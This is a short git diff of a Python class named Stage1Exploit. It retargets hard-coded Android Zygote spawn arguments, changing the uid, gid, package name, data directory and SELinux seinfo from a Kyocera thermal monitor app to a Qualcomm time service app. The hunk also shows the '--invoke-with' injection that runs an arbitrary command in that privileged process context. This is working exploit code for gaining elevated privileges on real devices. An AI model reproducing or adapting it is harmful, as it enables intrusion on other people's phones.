@@ -189,14 +189,14 @@ class Stage1Exploit:
         assert "," not in command
         # TODO let you specify the SELinux context through command line arguments
         raw_zygote_arguments = [
-            "--setuid=1000",
-            "--setgid=0",
+            "--setuid=10080",
+            "--setgid=1000",
             "--setgroups=3003",
             "--target-sdk-version=28",
-            "--nice-name=jp.kyocera.thermalmonitor",
-            "--app-data-dir=/data/user/0/jp.kyocera.thermalmonitor",
+            "--nice-name=com.qualcomm.timeservice",
+            "--app-data-dir=/data/user/0/com.qualcomm.timeservice",
             "--runtime-args",
-            "--seinfo=platform:thermmoni_serv:complete",
+            "--seinfo=platform:timeservice_app:complete",
             "--runtime-flags=1",
             "--invoke-with",
             f"{command}#",
